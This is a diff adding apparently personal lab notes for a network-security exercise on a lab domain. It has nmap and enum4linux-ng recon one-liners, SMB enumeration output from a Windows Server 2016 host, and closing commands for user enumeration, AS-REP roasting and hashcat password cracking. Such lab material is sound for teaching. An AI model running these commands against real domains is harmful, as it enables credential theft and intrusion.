@@ -1,0 +1,57 @@
+DHCP server
+nmap -sU -p 67 $(fping -a -g 192.168.29.0/24 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}')) --open | grep 'Nmap scan report for' | awk '{print $NF}'
+
+DC
+for i in $(fping -a -g 192.168.29.0/24 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}')); do echo $i; enum4linux-ng -A $i | grep 'Appears to be root/parent DC'; done
+
+
+3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain 
+Подход для универсальности:
+DNS и WHOIS → всегда работают.
+HTTP enumeration → работает на любом веб-сервере (Linux/Windows).
+SMB enumeration → полезно, если домен Windows, Linux обычно игнорирует.
+Команда Nmap будет выглядеть так:
+nmap -p 80,443 --script dns-brute,whois-domain,http-enum,smb-enum-shares <target>
+
+
+map -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users -Pn 192.168.29.204
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 13:20 EDT
+Nmap scan report for 192.168.29.204
+Host is up (0.00056s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:04:06:BE (VMware)
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: WIN-A8PBA9GL4GE
+|   NetBIOS computer name: WIN-A8PBA9GL4GE\x00
+|   Domain name: netsec.local
+|   Forest name: netsec.local
+|   FQDN: WIN-A8PBA9GL4GE.netsec.local
+|_  System time: 2025-09-13T15:24:58-07:00
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: <blank>
+|   \\192.168.29.204\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\192.168.29.204\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\192.168.29.204\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: READ
+|   \\192.168.29.204\NETLOGON: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: <none>
+
+Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
+
+
+kerbrute userenum  -d netsec.local --dc 192.168.29.204 userlist.txt 
+impacket-GetNPUsers netsec.local/ -usersfile userlist.txt -dc-ip 192.168.29.204 -format hashcat | grep -i '$krb' > users_hash.txt
+hashcat -m 18200 -a 0 users_hash.txt /usr/share/wordlists/rockyou.txt 
